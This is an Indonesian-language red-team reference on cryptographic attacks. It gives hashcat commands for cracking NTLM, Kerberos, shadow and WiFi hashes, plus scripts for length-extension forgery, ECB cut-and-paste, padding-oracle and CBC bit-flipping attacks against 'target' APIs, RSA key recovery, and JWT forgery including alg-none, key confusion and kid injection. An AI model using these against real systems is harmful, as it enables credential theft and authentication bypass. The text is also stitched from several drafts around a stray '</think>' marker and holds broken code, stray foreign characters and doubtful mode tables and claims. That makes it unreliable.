# crypto-attacks — crypto

# Cryptography Attacks — Referensi Operasional Red Team

## 1. Hash Cracking

### Hashcat — Mode Penting

| Mode | Algoritma | Contoh target |
|------|-----------|---------------|
| 0 | MD5 | Legacy CMS |
| 100 | SHA1 | Git object, lama |
| 1400 | SHA256 | Modern app |
| 1800 | sha512crypt ($6$) | /etc/shadow RHEL 9, Ubuntu 22.04+ |
| 3200 | bcrypt ($2*$) | Web app modern |
| 1000 | NTLM | Windows 11 24H2 SAM/LSASS dump |
| 2100 | DCC2 (Domain Cached Credentials v2) | CachedAD credentials |
| 13100 | Kerberos TGS-REP (etype 23) | Kerberoasting |
| 18200 | Kerberos AS-REP (etype 23) | AS-REP Roast |
| 22000 | WPA-PBKDF2-PMKID-EAPOL | WiFi |
| 22931 | Apple iWork | iCloud backup |
| 18800 | Android KDF | Android keystore |
| 13800 | WinZip | file terproteksi |
| 13400 | Keepass 1/2 (AES) | keepass2john output |
| 28900 | Argon2id | Modern hash, lambat |

### Perintah Dasar

```bash
# Kamus + rule
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --potfile-path cracked.pot

# One-liner rule → lihat dulu kanidat
hashcat -m 1000 ntlm.txt rockyou.txt -r best64.rule --stdout | head -20

# Mask attack pola perusahaan Corp2024!
hashcat -m 1000 -a 3 ntlm.txt '?u?l?l?l?l?l?d?d?d?d?d?s' --increment

# Weekday+season pattern (Serangan: Summer2024!, Winter2023!)
hashcat -m 1800 shadow.txt -a 3 \
  '?s?u?l?l?l?l?u?d?d?d?d?s' -w 3
```

### Rule yang sering menghasilkan

```perl
# /opt/rules/corp.rule
$1$9$9$9
cso0
$2$0$2$3
$2$0$2$4 
tse$1
```

Key rule bawaan high-yield: `best64.rule`, `dive.rule` (98k rule), `OneRuleToRuleThemAll.rule` (download dari GitHub, ~52k rule, terbukti paling produktif untuk NTLM/bcrypt).

### Optimasi

```bash
# Cek worksize device
hashcat -I
# Tune: benchmark okeh
hashcat -m 1000 --benchmark
# Sesuaikan
-O 3           # optimized kernels (potongan panjang maks 15/31 char)
-w 4           # workload insane, UI PC akan freeze
--backend-ignore-cuda   # paksa OpenCL kalau driver NVIDIA bermasalah
```

Kinematika: NTLM mode 1000 pada RTX 4090 ~200 GH/s; bcrypt mode 3200 ~18–20 kH/s (cost 10–12 dominan). Fix cost 12 = praktis non-recoverable untuk wordlist besar.

### Format hash

```bash
# /etc/shadow → format $6$salt$hash langsung dimasukkan
# NTLM → hexdigest kecil, tanpa awalan (jangan sertakan "user:")
# shell2hash (kalau OS tidak punya hashcat, but Baru system):

# hashcat-utils → tepat
unshadow /etc/passwd /etc/shadow > unshadowed.txt
# jalankan: hashcat -m 1800 unshadowed.txt rockyou.txt
```

---

## 2. Length Extension Attack

**What**: Banyak hash (MD5, SHA1, SHA256, SHA512 — Merkle-Damgård) dapat dikembangkan: hash(A‖secret‖B) diberikan A‖B, hash internal state bisa dilanjutkan tanpa tahu secret.

**Kondisi target**: `H(secret‖message)` dengan secret di depan, tanpa MAC (bukan HMAC).

### hashpumpy

```bash
pip install hashpumpy

hashpump --help
# Coba:
hashpump '<hash_diketahui>' '<data_diketahui>' '<data_tambahan>' '<secret_len>'
# Contoh:
hashpump '688787d8ff144c502c7f5cffaafe2cc5' 'amount=100&to=alice' '&to=attacker' 16
# Output: new hash, new message
```

### Python (SHA256 manual attack)

```python
from hashpumpy import hashpump
import requests

known_sig = "9f86d081884c7d65..."  # 64 hex char
msg = b'to=alice&amount=1'
forged_sig, forged_msg = hashpump(known_sig, msg, b'&amount=1000', 16)

# kWa: forged message contains \x80 + padding + len — kirim via URL-encoded
import urllib.parse
payload = {
  b'signature': forged_sig,
  'data': urllib.parse.quote(forged_msg)
}
print("Send:", payload)
# Kalau server langsung SHA256(secret + data) == signature: accepted
```

**Mengapa berhasil**: SHA256 tidak merepresentasikan panjang secret, konten, atau panjang asli — bisa dilanjutkan

**Mengapa gagal**: Target pakai HMAC, check hash pada kedua arah, atau pakai hash modern (SHA3/BLAKE2 — bukan Merkle-Damgård, plain hashing dengan secret di encrypted end).

---

## 3. ECB Cut-and-Paste

**Apa**: Block mode ECB — blok 16 identik → ciphertext identik. Disusun ulang ciphertext blok mengganti plaintext blok.

### Bukti

```bash
echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | openssl enc -aes-128-ecb -K 001122334455667778899AABBCCDDEE -nopad | xxd
# Blok ke-2 dan ke-3 identik → ECB terdeteksi
```

### Cut-Paste Profile Manipulation

```python
# Target: encrypt(profile=userX...admin=1... ) tanpa controlled bytes
# Step 1: Buat user "admin=1" di potongan blok
# "email=AAAAAA penn@x&uid=10&role=user" (16-byte block)

block_size = 16   # pastikan: berapa byte yang disisipkan
payload_email = "AAAA@xx.com"  # geser ke bait sehingga "admin\x0b\x0b..." jadi blok penuh

# Step 2 generate:
# 1. Ciphertext daftar: email=AAAAAAOadmin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b
# 2. Ambil ciphertext block ke-2 (berisi "admin" padded)
# 3. Ganti ciphertext block terakhir ("user") dengan block "admin" tersebut
# Server menerima: role=admin
```

Detect:
```python
#ECB oracle
detect = lambda c: len(set([c[i:i+16] for i in range(0,len(c),16)])) < len(c)//16
```

**Mengapa gagal**: Panjang record divalidasi server, checksum tambahan, GCM bukan ECB, atau sering dengan SHA final?

---

## 4. Padding Oracle (CBC)

**Kondisi**: Server response XOR dengan padding-nya (tetap proses xor — error timing, HTTP 500 vs 200, error ubah ciphertext → di byte lain).

### PadBuster

```bash
git clone https://github.com/GDSSecurity/PadBuster.git
# Decode plaintext:
./padbuster.pl "http://target/api" "INJECTED-CIPHERTEXT-BASE64" 16 -encoding 16
# Encode malicious plaintext (mis. injeksi admin=1):
./padbuster.pl "http://target/api?token=BASE64" "BASE64" 16 \
    -plaintext "user=attacker;role=admin" -encoding 16
```

### Manually (Python)

```python
import requests

URL = "https://target/api?data="
zero_iv = b"\x00" * 16

def oracle(ct):
    r = requests.get(URL + ct.hex(), timeout=5)
    return "PaddingError" not in r.text   # detect via one specific

# intinya:
# P[-1]' = C' ^ 0x01 ... tes byte by byte 1-256
# untuk p[-1] gunakan, dari 0x02, D bytes sebelumnya disesuaikan: C[-1]'^ P[-1] = C [-1] ^ orig[-1]
```

Contoh respons nyata:
- ASP.NET 4.8 / IIS 10: error padding menyebabkan HTTP 500 dengan Ekstensi `Padding is invalid and cannot be removed`
- Java: `javax.crypto.BadPaddingException` di respons aplikasi/TOMCAT log

**Mengapa gagal**: Modern stack = GCM/HMAC autentikasi, CBC tanpa MAC dkk. Tuning gagal karena timing kompresi (mis. server tetap 200 untuk membedakan status internal).

---

## 5. CBC Bit Flipping

**Apa**: CBC: P[i] = D(C[i]) XOR C[i-1]. Tanpa perlu oracle (tanship XOR), manipulasi plaintext langsung dengan mengubah ciphertext blok sebelumnya — korupi plaintext 1 blok sebelumnya. Merupakan jenis padding oracle yang lebih sederhana (tidak mengungkapkan plaintext).

```python
import base64

ct = base64.b64decode(token)
# original: "......;admin=false;......"
# flip r | input | known plaintext dari encrypted source:
#   ct_block[i-1][j] ^= ord(';')^ord('=')  di posisi fn an = etc.

pos, idx, forgery = ct[16:32], 10, '"true"'
# P block 2: ...admin=false
# posisi byte j di blok i: corrupt block i-1 byte j
target = bytearray(pos)
target[6] ^= ord('f') ^ ord('t')  # "false" → "trulse" bagus jika bit sesuai
target[7] ^= ord('a') ^ ord('r')
# flipping penuh false→true di 5 byte membutuhkan 5 corrupt byte — kadang lebih baik target "1" dan pad:
ex = base64.b64encode(bytes(target) + ct[32:]).decode()
print("New token:", ex)
```

**Mengapa berhasil**: Tidak ada MAC. **Gagal**: CBC dengan HMAC, GCM (tag invalid), atau plaintext pertama blok sebelumnya tidak divalidasi korupsi (server reject korupsi "checksum" — record gagal).

---

## 6. RSA Attacks

Setiap: RSA modulus = N = pq. kuncinya serangan pada pemilihan kunci.

### a) Common Modulus (sama N, e beda)

```python
# Target: c1 encrypt dgn e1, c2 encrypt dgn e2, sama N, message sama, gcd(e1,e2)=1
from Crypto.Util.number import inverse
n, c1, c2, e1, e2 = ...
g = inverse(e1, e2)     # atau extended gcd: a*e1 + b*e2 = 1
m = (pow(c1, a, n) * inverse(pow(c2, -b, n), n)) % n
```

RsaCtfTool:

```bash
# Recon RSA dari server (openssl s_client -connect x.com:443 | openssl x509 -noout -text)
./RsaCtfTool.py --publickey key.pem --decryptfile cipher.bin
# Includes: common modulus, Wiener, Hastad, shared prime
```

### b) Wiener (d ~ N^0.25)

```
# d  terlalu kecil (e besar). continued fraction expansion e/n.
openssl rsa -in key.pem -noout -text | grep -A1 "publicExponent:"
# e > 0x10001 (65537) → mencurigakan
RsaCtfTool --publickey pub.pem --attack wiener --private
```

### c) Hastad (broadcast lin. e)

```
# Sama m dikirim ke e penerima dgn N_i beda, gcd(N_i, N_j) = 1
# CRT → m^e mod N1N2...Ne → puncak hasil: m^e < N1N2..Ne → ambil integer e-th root
```

etool ctf: `pow`-powb dgn CRT — `sympy.ntheory.modular.crt`

```
from sympy.ntheory.modular import crt
from gmpy2 import iroot
x, _ = crt([n1,n2,n3], [c1,c2,c3])
m, ok = iroot(x, 3)   # e=3
```

### d) Shared prime (faktor kecil, past prime)

```
# Finger: dua server pakai N penuh, prime factor yang sama jika bisa dikenali
# cek: gcd(N1, N2)
openssl x509 -in cert.pem -noout -modulus

python3 -c "
cimport math
n1, n2 = ...
g = math.gcd(n1,n2)
print('shared prime:', g if g>1 else 'no')"
```

Live-leak nyata: banyak IoT / appliance terlihat pakai N sama → batch GCD database: `crt.sh`? no — `https://keychest.net`, bongkar langsung via `factor` key. Setelah p, q factor → buat.d → source key:

```bash
# Setelah factor p dan q
openssl rsa -in pub.pem -notout -modulus
# rebuild private:
RsaCtfTool --publickey pub.pem --private --decryptfile flag.bin
```

**Mengapa gagal**: Target menggunakan e=65537, N besar (2048+) dan dibuat dengan prime acak sejati. **Yield tinggi** pada: IoT, self-signed appliance, internal app legacy, entropy buruk (Debian 2006-2012 style key weak — cek fingerprint uN)

---

## 7. JWT Crypto Abuse

### Algoritma none

```python
import jwt
# Send:
".eyJhbGciOiJub25lIiwidHlwIjoiSndUIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9."
# Dalam jwt library legacy: decode without verify jika "alg":"none" diterima
```

`jwt.decode(token, verify=True)` di PyJWT < 1.5.0 (yaitu 2018, git flags **alg none ok**) — fix dgn options={"verify_signature": True} + allowlist algoritme.

### RS256 → HS256 confusion

```python
# Server verifikasi signature pakai kunci publik RSA, tapi program sebenarnya mengizinkan
# algoritme via header, tak dipin ("algoritme apapun beraudit"):
# JWT sign metadata ini: HMAC-SHA256 dengan "kunci" = RSA public key (PEM bytes)

pub = open("public.pem","rb").read()
import jwt, base64
header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=')
payload = base64.urlsafe_b64encode(b'{"sub":"1337","admin":true}').rstrip(b'=')
sig = base64.urlsafe_b64encode(
    jwt.utils.hmac["HS256"](header+b'.'+payload, pub)
).rstrip(b'=')
print(f"{header.decode()}.{payload.decode()}.{sig.decode()}")
```

Berhasil pada: `jsonwebtoken` Node < 4.2.2 (CVE-2015-9235), pyjwt versi tak mem-pin `algorithms`, lama Go `dgrijalva/jwt-go` (<4, lama umum).

### Weak HMAC secret → crack

```bash
# Ekstrak dgn hashcat mode: mode 16500 = JWT
hashcat -m 16500 jwt.txt rockyou.txt -r dive.rule
# hashcat support HS256/384/512 (mode 16500, 16511 dsb.)
```

### Kunci publik / kid injection

```json
{"alg":"RS256","kid":"' UNION SELECT 'key'--"}
```

 atau file path traversal pada header kid, atau path traversal sebenarnya:

```json
{"alg":"HS256","kid":"../../dev/null"}
# Node: verify dgn kunciFromFile(kid) di dev/null → null → secretnya diketahui
```

### Signature → dapatkan token lewat verify engine lain

Library rust jsonwebtoken 8.x+ sangat ketat, `Nodes jsonwebtoken>=9` (CVE-2022-23529 family) sudah menutup banyak jalur.

## bukan disclosure perintah

---

## 8. Jebakan Operasional (kenapa gagal)

1. **Hashcat raglib conflict** — hashcat 6.2.6 di Ubuntu 22.04 default kernel OpenCL punya bug; fallback `--backend-ignore-opencl` atau gunakan hashcat dari repositori resmi.
2. **Rules besar → lambat** pada mode bcrypt (cost 12+). `--limit` atau taruh rule besar hanya untuk fast hash.
3. **Hash NTLM replay** — `--show` sebelum menambah kamus; atau potensi hashing double because of normalisasi (unshadowed, NT hash of UTF-16LE — uppercase password salah, cek `$HEX[...]` output).
4. **Length ext / ECB / CBC / padding oracle**: semua gagal bila target pakai `cryptography>=3.9` (Python) default parameter atau stack seperti nginx 1.25 + TLS 1.3 (AEAD) untuk transport — serangan ini hanya untuk *application-layer* custom encryption. Cek dulu apakah aplikasi memakai library modern: eksposur utamanya **legacy internal API, esoteric vendor box, CTF-style dev API**.
5. **RSA**: kunci 1024-bit masih ada di appliance (printer web admin, IoT) tapi GMP-ECM/GPU factoring untuk 512-bit memakan waktu di lapangan; shared-prime batch attack perlu database modulus publik (censys, scans.io) — kadang target tapi bukan makin.
6. **JWT**: `verify=True` vs `verify_signature` — PyJWT 2.x default REJECT none, decode lama di dokumentasi codereview kadang menyesatkan; pastikan target benar-benar versi lama (cek `/package.json`, `requirements.txt`, error path).
7. **Transactional rate**: padding oracle membutuhkan rata-rata ~256 request/block = ~4k request per 16-byte blok → WAF/CDN (Cloudflare, nginx limit_req) memblokir. Kebutuhan kecepatan oracle: rata-rata USB — kunci sidebar perlu rotateIP proxy tunnel.
8. **Operation security**: hashcat potfile → kredensial sensitif; simpan di vault, jangan log. Untuk klien red team, hash yang bisa dipulihkan sering SCOPED diatur SOW: verifikasi token Hashproof-of-recovery ada purview.
9. **WPA3 + 22000 mode**: mode 22000 menerima PMKID *dan* handshake, mode tua 16800 sudah deprecated di hashcat 6.2.5+.
10. **bcrypt**: banyak password manager (KeePass) pakai transformasi kdf custom per Versi — cek file `.kdbx` gunakan `keepass2john` versi jumbo JohnTheRipper 1.9.0+ (1st arg `kdbx` version).</think># Bab 7 — Referensi: Cryptography Attacks

## 1. Hash Cracking

### 1.1 Hashcat modes penting

| Mode | Algoritma | Sumber umum |
|---|---|---|
| 0 | MD5 | Legacy CMS, cache |
| 100 | SHA1 | Sertifikat lama, git objects |
| 1400 | SHA256 | Aplikasi modern |
| 1800 | sha512crypt ($6$) | `/etc/shadow` RHEL 9 / Ubuntu 24.04 |
| 3200 | bcrypt ($2*$) | Web app (cost ≥10 lambat) |
| 1000 | NTLM | Dump LSASS, SAM Windows 11 24H2 (NT hash = MD4) |
| 3100 | Oracle 11+ | Hash password DB |
| 13100 | Kerberos TGS-REP etype 23 (RC4) | Kerberoasting |
| 18200 | Kerberos AS-REP etype 23 | AS-REP roasting |
| 7500 | Kerberos 5 AS-REQ etype 23 | Kerberoast dari traffic |
| 22000 | WPA-PBKDF2-PMKID+EAPOL | WiFi (pengganti 16800/22001) |

**Yang dikirim**: file berisi hash dalam format sesuai mode. **Yang muncul**: plaintext di `hashcat.potfile` dan stdout `status: Cracked`. **Kenapa berhasil**: wordlist + rule menutup pola password manusiawi; raw brute force hanya realistis pada mode ≤ 1000 (GPU +100 GH/s di NTLM vs ~20 kH/s di bcrypt cost 10).

```bash
# Format 22000: hccapx harus dikonversi dulu
hcxtools/hcxpcapngtool -o capture.22000 capture.pcapng
hashcat -m 22000 capture.22000 wordlist.txt -r rules/dive.rule

# Prep hash file dari /etc/shadow (ambil field hash saja, hashcat mode 1800 menerima $6$salt$hash utuh)

# Sandbox output rule sebelum run penuh
hashcat -m 1000 --stdout -r rules/best64.rule wordlist.txt | head
```

### 1.2 Rules (mutasi wordlist)

Rule penting: `best64.rule` (default, baseline), `dive.rule` (~98k rules, kena pola `Password123!`), `OneRuleToRuleThemAll.rule` (eksternal, ~53k, paling produktif untuk NTLM di engagement AD).

```bash
# Rule custom
cat > corp.rule <<'EOF'
$2$0$2$5
c $1$2$3
so0 si1 se3 sa@ ss$ st+
$1$9$7$9 $k
EOF
hashcat -m 1000 ntlm.txt rockyou.txt -r corp.rule --potfile-path ./cracked.pot
```

### 1.3 Mask attack (brute force terstruktur)

```bash
# Pola: Summer2025! Corp2025 cis-delta
# ?u?l?l?l?l?d?d?d?d?s = kata 5 huruf + 4 digit + simbol
hashcat -m 1800 hashes.txt -a 3 '?u?u?l?l?l?l?d?d?d?d?s' --increment

# Charset custom: hex, atau digit perusahaan
hashcat -m 1000 -a 3 ntlm.txt -1 2025 -2 '!@#' '?l?l?l?l?1?1?1?1?2?2'
```

Kecepatan: mask -a 3 pada 8 karakter lower ntlm ~ hitungan detik RTX-class, 9+ karakter melampaung jauh.

### 1.4 John alternatif

```bash
unshadow passwd shadow > unshadowed.txt
john --wordlist=rockyou.txt --rules=Jumbo unshadowed.txt
```

## 2. Length Extension Attack

**Kondisi**: fungsi MAC = `H(secret ‖ message)` dengan H = MD5/SHA1/SHA256 (Merkle–Damgård, tanpa finalisasi panjang aman). Diketahui: `message`, `H(secret‖message)`, dan panjang secret (dibrute 4–64 byte).

**Yang dikirim**: message asli + padding internal + `admin=true` (atau apapun), dengan hash baru hasil extend.
**Kenapa gagal**: HMAC (di mana pun), SHA3/BLAKE2, atau jika server melakukan `H(message‖secret)` (suffix, kebal).

```python
from hashpumpy import hashpump
# hashpump(digest asli, data asli, data tambahan, panjang key)
new_sig, new_msg = hashpump(
    b'6d5f....',           # signature dari respons server
    b'amount=100&user=bob',
    b'&admin=true',
    16                      # tebak panjang secret; loop 0..64
)
import requests
requests.get("https://target/api", params={
    "data": "amount=100&user=bob\\x80\\x00...".encode(),  # new_msg sudah berisi raw padding
    "sig": new_sig.hex(),
})
```

Fingerprinting kondisi: respons dengan `sig` 32/40/64 hex + message MAC'd di depan → uji coba loop panjang secret 1–40; kegagalan total = HMAC, hentikan.

## 3. ECB Cut-and-Paste

**Kondisi**: AES-ECB tanpa IV acak, plaintext yang dikontrol penuh untuk blok tertentu (profil user, email submission).

**Yang dikirim**: register dengan email yang menggeser `admin\x0b...` ke boundary blok 16 byte → ambil ciphertext blok itu → paste menggantikan blok `user`.
**Kenapa berhasil**: ECB adalah fungsi deterministik per-blok, tidak ada integrity check. **Gagal**: ada MAC/HMAC di atas ciphertext, atau panjang plaintext divalidasi.

```python
def register(oracle, email):
    return oracle.encrypt(f"email={email}&uid=10&role=user")

c1 = register(o, "A" * 10 + "admin" + "\x0b" * 11)
# Dalam c1: blok 2 = "A"*10 + "admin" + "\x0b"*11 (16 byte)
# Dalam c2 = register(o, "B"): blok terakhir = "user"  occupy blok sendiri
# forged = c1[:16] (header/email block) + blok 2 dari c1
# Kirim forged sebagai cookie → server dekripsi → role=admin
```

## 4. Padding Oracle (CBC)

**Kondisi**: aplikasi CBC tanpa MAC, disclosure terlebih dulu menentukan plaintext, memberikan feedback orakel — pengecualian berdasarkan padding (timing / kode respons).
**Yang dikirim**: modifikasi ciphertext byte demi byte, blok demi blok. **Yang keluar**: plaintext penuh tanpa key. **Kenapa berhasil**: PKCS#7 check dulu sebelum dekripsi/MAC check; kegagalan distingtif = informative oracle.

```bash
padbuster "https://target/profile" "ENCODED_CFB64" 16 -cookies "session=..." -encoding 0
# 256 request per byte, ~16 bytes per blok → scalekan dengan single-thread
```

```python
import requests, base64
def padding_oracle(ct_bytes, iv):
    r = requests.get(f"https://target/api?data={base64.b64encode(iv+ct_bytes).decode()}")
    return b"PaddingException" not in r.content  # 200 = padding valid

def decrypt_block(ct_block, prev_block):
    prev = bytearray(prev_block)
    out = bytearray(16)
    for pad_val in range(1, 17):
        for guess in range(256):
            prev_inter = bytearray(prev)
            for i in range(pad_val):
                prev_inter[-i] = pad_val ^ out[-i]
            # (disederhanakan) ...
```

**Kenapa gagal**: CBC + HMAC / MAC-then-encrypt aman (TLS ≥ 1.2 dengan HMAC dulu), GCM (TLS 1.3, nginx 1.25 default config modern), atau respons tidak bisa dibedakan (constant-time, semua error → 403 umum). Banyak framework Java lama (Java 8 sebelum update April 2022 di CBC mode enabled by default di runtime) masih rentan — CVE-2022-21449 itu ECDSA, beda keluarga tapi sering muncul di assessment target Java.

## 5. CBC Bit Flipping

**Kondisi**: CBC tanpa MAC, plaintext dependen privilese ("user=attacker;role=user") diketahui posisinya.

**XOR-injection sendiri**:

```python
plain_wanted_delta = b"^" # XOR operasi yang diperlukan
ct = bytearray(base64.b64decode(cookie))
posisi = 6 # offset byte 'user' target
original, desired = b"user", b"admin"
for i in range(4):
    ct[6 - 16 + i] ^= original[i] ^ desired[i]  # ubah blok sebelumnya
requests.get(url, cookies = { "auth": base64.b64encode(bytes(ct)).decode() })
```

Halaman sebelumnya di plaintext akan rusak total (previous block corrupted) — pastikan server hanya memvalidasi blok target (atau blok sebelumnya tidak dipakai).

**Kenapa gagal**: AEAD (GCM) akan menolak karena tag mismatch — modifikasi 1 byte langsung gagal auth sebelum decrypt.

## 6. RSA

### 6.1 Common Modulus

**Kondisi**: pesan yang sama dienkripsi dengan dua public key berbeda, key pada modulus yang sama (reuse keygen), `gcd(e1,e2)=1`.
**Hasil**: plaintext penuh tanpa faktorisasi. **Gagal**: modulus berbeda, atau `gcd(e1,e2)>1`.

```python
from Crypto.Util.number import inverse, long_to_bytes
n = ...
c1 = pow(m_orig, e1, n) # dari traffic/DB
c2 = pow(m_orig, e2, n)
# a*e1 + b*e2 = 1 via egcd
a = inverse(e1, e2) # lightweight untuk e1*e2 < N²
m = (pow(c1, a, n) * inverse(pow(c2, -1 % (n-1), n), n)) % n # careful: gunakan extended gcd proper
print(long_to_bytes(m))
```

### 6.2 Wiener's Attack

**Kondisi**: `d < N^0.25 / 3` → kunci `e` sangat besar (misalnya 30+ digit) dari keygenibur. 
**Hasil**: `d` penuh via continued fraction of e/N. **Gagal**: d konvensional, key dirakit ulang.

```bash
RsaCtfTool --publickey pub.pem --attack wiener --private > priv.pem
```

### 6.3 Hastad (broadcast attack)

**Kondisi**: pesan sama dienkripsi ke ≥e penerima dengan modulus unik, `e=3` dan pesan < N/2. Cukup 3 ciphertext:
**Hasil**: CRT kombinasi → `m = c^(1/3)` tanpa modulus. **Gagal**: OAEP padding (modul modern Node ≥15, OpenSSL 3.x default OAEP).

### 6.4 Shared Prime (GCD)

**Kondisi**: dua modulus RSA share faktor p. Kejadian nyata pada appliance & IoT dgn PRNG buruk; target corp modern generated via HSM sangat kecil kemungkinan, tapi kunci tahun 2010-2012 di tempat legacy setahubung.
**Hasil**: private key dari kedua target.

```python
from math import gcd
n1, n2 = 0x..., 0x...
p = gcd(n1, n2)
if p > 1:
    q1, q2, e = n1//p, n2//p, 65537
    d1 = pow(e, -1, (p-1)*(q1-1))  # pow(x, -1, m) ada sejak Python 3.8
```

```bash
# Batch: kumpulkan modulus dari sertifikat target (subdomain internal, IDRP)
openssl s_client -connect host:443 2>/dev/null | openssl x509 -noout -modulus | cut -d= -f2
# Kumpulan modulus → all-pairs gcd
```

## 7. JWT Crypto Abuse

### 7.1 alg: none (implementasi kusut)

**Kirim**: token dengan header `{"alg":"none","typ":"JWT"}` dan signature kosong.
**Gagal**: library modern — `jsonwebtoken@9+` (Node) menolak, PyJWT 2.x wajib daftar algorithms allowlist. **Berhasil**: PyJWT <1.5.0 tanpa `verify_signature` eksplisit, beberapa stack .NET legacy.

```bash
# Craft manual
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
echo -n '{"sub":"1337","role":"admin","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '='
# token = header.payload.   (titik + kosong)
```

### 7.2 RS256 → HS256 key confusion (CVE-2015-9235 family)

**Kondisi**: server punya public key untuk verifikasi RSA tapi tidak mengunci header `alg` → kita sign HMAC dengan **public key sebagai secret**.

```python
import jwt, json
from cryptography.hazmat.primitives import serialization
pub_pem = open("pub.pem","rb").read()  # public key certificat target
headers = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "1337", "role": "admin", "iss": "target-issuer", "exp": 4102444800}
token = jwt.encode(payload, pub_pem, algorithm="HS256", headers=headers)  # jsroot elsewhere
```

Tes juga varian: HS256 dengan key PEM-without-headers, DER raw — developer verifier beda-beda parsing key.

### 7.3 Weak HMAC secret & kid injection

```bash
hashcat -m 16500 jwt.txt rockyou.txt -r rules/dive.rule   # mode 16500 = JWT HS256
# Hasil: secret misal "jwt_secret" → forge token bebas
```

`kid` injection:

```json
{"alg":"HS256","kid":"../../dev/null"}
```

Path traversal di kid → read key arbitraris kadang bisa disalahguna sebagai HMAC secret (`kid: "/dev/null"` = empty key sign

## [lanjutan]

# 4.2 Cryptography Attacks (Lanjutan)

## 4.2.8 Hashcat: Mode Lanjutan & Debugging Operasional

### Pemecahan Masalah Queuing (Edge Case Terbaru: Driver NVIDIA 545+)

Driver ≥545 di Linux kadang menyebabkan hashcat macet di "Starting attack". Workaround:

```bash
# Bypass memory allocator lama
hashcat -m 3200 hash.txt -a 3 ?u?l?l?l?l?l?d?d?d --backend-ignore-cuda -D 2

# Jika stuck di status, matikan workload profile otomatis
hashcat -m 3200 hash.txt -a 3 ?u?l?l?l?l?l?d?d?d -w 3 --status --status-timer 5
```

**Jebakan**: hashcat abort dengan `Kernel minimum工作组 size` error pada GPU RV series. Solusi: `--backend-devices 1,2` untuk exclude device bermasalah, jangan `-D 1,2` karena OpenCL CPU fallback memperlambat batch.

### Benchmark Lying (Self-test dengan --left)

```bash
# Verifikasi hasil restore benar-benar plaintext valid:
hashcat -m 1800 --show hash.txt                     # tampilkan hasil tersimpan
hashcat -m 1800 --left hash.txt                    # hash YANG BELUM pecah — kritis untuk laporan
hashcat -m 1800 --show --username hash.txt         # format user:hash
```

**Edge case**: `--left` tanpa potfile akan tampil kosong. Selalu pakai `--potfile-path` eksplisit saat server berbeda-session.

### Mode Kunci HTTP MD5 API (`-m 3910` vs `-m 3920`)

```bash
# 3910 = md5($salt.$pass)  — SAP "B" users
# 3920 = md5($pass.$salt)  — SAP "F/G" passive users
hashcat -m 3920 -a 0 sap_hashes.txt dict.txt -r rules/best64.rule --_username
```

**Jebakan**: SAP hash selalu prefix dengan `B` + 40 hex. Strip manual `cut -d: -f2 | cut -c2-` sebelum feed.

### Maskfile Attack (Multi-mask Dalam Satu File)

Buat `target.hcmask`:
```
?u?l?l?l?l?l?d?d,
?u?l?l?l?l?l?l?d,
?u?l?l?l?l?l?l?d?d,
```

```bash
hashcat -m 1000 ntlm.txt target.hcmask
```

**Perhatian**: `.hcmask` dengan koma literal dalam mask harus di-escape dengan `\\,` — hashcat baru (v6.2.6+) menginterpretasikan koma nan-newline sebagai separator.

### Increment + Custom Charset Fleksibel

```bash
# charset custom multi-posisi: -1 sampai -4
hashcat -m 1000 ntlm.txt -a 3 --increment --increment-min 8 --increment-max 16 \
  -1 ?l?d -2 ?u -3 !@#$% -4 ?s \
  ?2?1?1?1?1?1?1?1?4?1?1
```

Perfomance tip: urutan charset `?1?1?1...` dengan `--increment` memproses mask paling pendek dulu — hashcat me-reuse kernel. Jangan pisah jadi command per-length; itu membuang kernel warm-up.

### Rule Pack Prioritas by Target

| Target | Rule Pack | Note |
|---|---|---|
| Corporate AD | `dive.rule` (99k rule) | Boros GPU time; jalankan di fase 3 |
| Personal / email | `best64.rule` lalu `OneRule-to-rule-them-all` | PLUS-rule lebih efektif untuk leet |
| Standar Bahasa non-EN | `toggles-l5.rule` + custom IPA | bahasa Indonesia: tambah sendiri rule vocal replace `so0`, `sa@` |
| Password lama era 2005 | `d3ad0ne.rule` | |
| Wi-Fi WPA | `rockyou-75.rule` | |

Buat rule vokal Indonesia:
```
# tambahkan ke rules/custom_id.rule
so0
sa0
si1
se3
swap: su3
```

**Jebakan rule syntax**: komentar `#` hanya valid di paling kiri (kolom 1), tidak bisa di-Inline setelah rule. Rule dengan `t` (toggle case) di posisi awal berlaku... hanya satu posisi — gunakan `T`, atau `Tq`, atau literal `E` untuk toggle-all: `EXo0` (toggle all → append o0).

### Session Management & Restore

```bash
#Mulai batch berdurasi panjang
hashcat --session pentest-jumat -m 1000 ntlm.txt -a 0 dict.txt -r best64.rule

# crash / reboot terjadi. Resume:
hashcat --restore pentest-jumat
```

File session disimpan di `~/.local/share/hashcat/sessions/` (v6.2.x) — BUKAN `~/.hashcat/` lagi. **Jebakan**: restore gagal jika path dictionary berubah. Simpan dict di path absolut, bukan tmpfs.

### Wordlist Generator On-device (-a 6 / -a 7 combo)

```bash
# -a 6 = dict + mask (mask di kanan)
hashcat -m 1000 hashes.txt -a 6 rockyou.txt ?d?d?d?d
# -a 7 = mask + dict (mask di kiri)
hashcat -m 1000 hashes.txt -a 7 "?u?l?l?l?l " rockyou.txt
```

Password policy korporat "huruf besar + angka di akhir": `?u?l?l?l?l?l?d?d?d?d`. Kombinakan `-a 6` + `--increment` 8..12.

### Varian Per Produk Software

| Produk | Mode | Format Hash |catatan |
|---|---|---|---|
| MSCHAPv2 / NetNTLMv1 | 5500 | `user::domain:hash:hash:challenge` | Crack lalu gunakan untuk pass-the-hash |
| NetNTLMv2 | 5600 | `user::domain:challenge:hash:challenge` |          crack di jaringan tidak perlu — capture ulang lebih cepat |
| KeePass 1.x AES | 13400 | atomic per KDB | CPU-only masih, jangan gunakan GPU on huge |
| KeePass 2.x AES | 13400 byte varian Argon2 | 19700 / 19750 (KDBX4 Argon2) | GPU per-slow; estimasi dulu: `hashcat -m 19750 -b` |
| Android lockscreen PIN | 5800 | salt + sha1 | Biasanya 4-6 digit → mask singkat |
| EOS Blockchain key | 12400 | Legacy 1Password wax |— |
